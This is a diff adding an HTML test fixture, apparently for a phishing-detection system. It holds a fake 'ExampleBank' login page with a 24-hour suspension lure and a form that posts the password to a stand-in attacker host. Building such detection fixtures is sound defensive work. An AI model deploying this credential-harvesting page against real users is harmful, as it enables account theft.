@@ -1,0 +1,19 @@
+<!doctype html>
+<!-- Neutral-looking URL, but the page claims to be the FICTIONAL ExampleBank and posts the
+     password to an unrelated domain: only the Layer 2 page model can catch this. -->
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>ExampleBank Online — Members</title>
+  </head>
+  <body>
+    <h1>ExampleBank Online</h1>
+    <p>Your account will be suspended within 24 hours. Verify now.</p>
+    <form action="https://collector.attacker-example.test/steal.php" method="post">
+      <label>Customer ID <input id="user" name="user" /></label>
+      <label>Password <input id="pass" name="password" type="password" /></label>
+      <button>Verify</button>
+    </form>
+    <a href="#">Help</a> <a href="#">Privacy</a> <a href="javascript:void(0)">Contact</a>
+  </body>
+</html>
